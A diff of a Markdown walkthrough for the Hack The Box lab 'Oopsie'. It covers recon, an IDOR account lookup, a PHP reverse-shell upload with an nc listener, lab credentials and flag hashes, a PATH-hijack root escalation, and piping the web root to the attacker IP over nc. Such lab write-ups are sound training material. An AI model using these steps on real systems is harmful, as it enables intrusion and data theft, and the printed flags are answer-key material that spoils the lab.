@@ -1,12 +1,17 @@
-inet 10.10.14.69  netmask 255.255.254.0
-inet6 fe80::d484:44d2:fd97:c02c
-
 # Oopsie
 
-## nmap
+## Ifconfig
 
-sudo nmap -sC -sV -A 10.10.10.28
+<pre>
+inet 10.10.14.69  netmask 255.255.254.0
+inet6 fe80::d484:44d2:fd97:c02c
+</pre>
 
+## Nmap
+
+> sudo nmap -sC -sV -A 10.10.10.28
+
+<pre>
 Nmap scan report for 10.10.10.28
 Not shown: 997 closed tcp ports (conn-refused)
 PORT     STATE    SERVICE       VERSION
@@ -20,37 +25,64 @@ PORT     STATE    SERVICE       VERSION
 |_http-title: Welcome
 3268/tcp filtered globalcatLDAP
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</pre>
 
-gobuster dir -x "php, css, js, html, txt, xml, json" -u "http://10.10.10.28" -w "/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt"
+## Test gobuster (Not pretty well)
 
+> gobuster dir -x "php, css, js, html, txt, xml, json" -u "http://10.10.10.28" -w "/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt"
+
+<pre>
 find index.php, uploads/ to infer some certain files may onload
+</pre>
 
-nikto finds cdn-cgi/login as a CGI directory
+## Use nikto finds cdn-cgi/login as a CGI directory
 
+<pre>
 username: admin
 password: MEGACORP_4dm1n!!
+</pre>
 
-http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id="X"
-find accounts
-Account ID: 86575
-Name: super admin
-Email: superadmin@megacorp.com
+and then reach http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id=**X**
 
-upload [reverse shell php](https://github.com/pentestmonkey/php-reverse-shell) to server within super admin
+- Use [script](./scripts/account_find.py) to find accounts **X**
 
-use nc -lvnp port to listen reverse shell file to connect
-as http://10.10.10.28/uploads/revshell.php
+<pre>
+Found at id:    30
+Account ID:     86575
+Name:           super admin
+Email:          superadmin@megacorp.com
+</pre>
 
-whoami www-data
+- upload [reverse shell php](https://github.com/pentestmonkey/php-reverse-shell) to server within super admin
+
+- use nc -lvnp port to listen reverse shell file to connect
+as http://10.10.10.28/uploads/[revshell.php](./scripts/revshell.php)
+
+> whoami
+
+<pre>
+www-data
+</pre>
+
+> id
+<pre>
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</pre>
 
+- find user.txt in robert home
+
+<pre>
 user.txt
 f2c74ee8db7983851ab2a96a44eb7981
+</pre>
 
-get a better (interactive) bash use
+- get a better (interactive) bash use
+
 > /usr/bin/script -qc /bin/bash /dev/null
 
 ## script help
+
+<pre>
 -a, --append                  append the output
 -c, --command <command>       run command rather than interactive shell
 -e, --return                  return exit code of the child process
@@ -60,30 +92,55 @@ get a better (interactive) bash use
 -t[<file>], --timing[=<file>] output timing data to stderr or to FILE
 -h, --help                    display this help
 -V, --version                 display version
+</pre>
 
-www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php
+## Get db.php content
+
+> cat db.php
+
+<pre>
 <?php
 $conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
 ?>
 
 username: robert
 password: M3g4C0rpUs3r!
+</pre>
 
-because ssh port 22 has open
-ssh robert@10.10.10.28
+- because ssh port 22 has open
 
-command input "id"
+> ssh robert@10.10.10.28
+
+- command input "id"
+
+<pre>
 uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
+</pre>
+
 => group contains "bugtracker"
 
-robert@oopsie:/usr/bin$ find / -type f -group bugtracker 2> /dev/null
-(2> dev/null mean discard unnecessary data message)
-=> /usr/bin/bugtracker
 
-file bugtracker
+> find / -type f -group bugtracker 2> /dev/null
+
+*(2> dev/null means discard unnecessary data message)*
+
+<pre>
+/usr/bin/bugtracker
+</pre>
+
+- Not important message
+
+> file bugtracker
+
+<pre>
 bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped
+</pre>
 
-strings bugtracker
+- Check content of bugtracker
+
+> strings bugtracker
+
+<pre>
 ------------------
 : EV Bug Tracker :
 ------------------
@@ -91,18 +148,34 @@ Provide Bug ID:
 ---------------
 cat /root/reports/
 ;*3$"
+</pre>
 
-echo /bin/bash -P > cat in ~/tmp (echo /bin/sh > cat)
-chmod +x cat (switch to local tmp file 'cat')
-export PATH=/home/robert/tmp:$PATH
-exec bugtracker
+- Establish a fake cat instead of root used
+
+> echo /bin/bash -P > cat in ~/tmp (or echo /bin/sh > cat)
+
+- Switch to local tmp file 'cat'
+
+> chmod +x cat 
+
+- Add PATH
+
+> export PATH=/home/robert/tmp:$PATH
+
+then exec bugtracker
 
 any root privilege read file's bin root.txt
+
+<pre>
 root.txt
 af13b0bee69f8a877c3faf667f7beacf
+</pre>
 
-## report contents
-1.
+## Report contents
+
+- Report 1
+
+<pre>
 Binary package hint: ev-engine-lib
 Version: 3.3.3-1
 Reproduce:
@@ -111,8 +184,11 @@ What you expected to happen:
 Synchronized browsing to be enabled since it is enabled for that site.
 What happened instead:
 Synchronized browsing is disabled. Even choosing VIEW > SYNCHRONIZED BROWSING from menu does not stay enabled between connects.
+</pre>
 
-2.
+- Report 2
+
+<pre>
 If you connect to a site filezilla will remember the host, the username and the password (optional). The same is true for the site manager. But if a port other than 21 is used the port is saved in .config/filezilla - but the information from this file isn't downloaded again afterwards.
 ProblemType: Bug
 DistroRelease: Ubuntu 16.10
@@ -125,8 +201,11 @@ Date: Sat May 7 16:58:57 2016
 EcryptfsInUse: Yes
 SourcePackage: filezilla
 UpgradeStatus: No upgrade log present (probably fresh install)
+</pre>
 
-3.
+- Report 3
+
+<pre>
 Hello,
 When transferring files from an FTP server (TLS or not) to an SMB share, Filezilla keeps freezing which leads down to very much slower transfers ...
 Looking at resources usage, the gvfs-smb process works hard (60% cpu usage on my I7)
@@ -168,8 +247,11 @@ Tags: trusty
 Uname: Linux 3.13.0-19-generic x86_64
 UpgradeStatus: Upgraded to trusty on 2014-03-25 (0 days ago)
 UserGroups:
+</pre>
 
-.config/filezilla/filezilla.xml
+## Goto the .config/filezilla/filezilla.xml in root dir
+
+<pre>
 <?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
 <FileZilla3>
     <RecentServers>
@@ -189,14 +271,18 @@ UserGroups:
         </Server>
     </RecentServers>
 </FileZilla3>
+</pre>
 
 ## Get the /var/www/html files
 
-in /var/www wrap html first
+- in /var/www wrap html first
+
 > tar -czf html.tar.gz html
 
-**server**
-> cat html.tar.gz | nc 10.10.14.69 *any port*
+*Server*
 
-**client**
-> nc -l -p *any port* -q 1 > html.tar.gz < /dev/null
+> cat html.tar.gz | nc 10.10.14.69 *port*
+
+*Client*
+
+> nc -lvnp *port* -q 1 > html.tar.gz < /dev/null
